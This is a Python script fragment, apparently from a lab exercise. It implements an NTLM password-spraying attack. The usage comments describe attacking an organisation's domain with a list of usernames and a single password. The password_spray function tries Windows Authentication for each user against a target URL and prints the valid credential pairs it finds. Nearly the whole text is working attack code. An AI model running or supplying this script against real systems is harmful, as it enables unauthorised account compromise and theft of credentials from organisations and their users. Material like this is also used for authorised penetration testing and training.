#USE python ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>

#   <userfile> - Textfile containing our usernames - "usernames.txt"
#   <fqdn> - Fully qualified domain name associated with the organisation that we are attacking
#   <password> - The password we want to use for our spraying attack
#   <attackurl> - The URL of the application that supports Windows Authentication

def password_spray(self, password, url):
    print ("[*] Starting passwords spray attack using the following password: " + password)
    #Reset valid credential counter
    count = 0
    #Iterate through all of the possible usernames
    for user in self.users:
        #Make a request to the website and attempt Windows Authentication
        response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
        #Read status code of response to determine if authentication was successful
        if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
            print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
            count += 1
            continue
        if (self.verbose):
            if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                print ("[-] Failed login with Username: " + user)
    print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")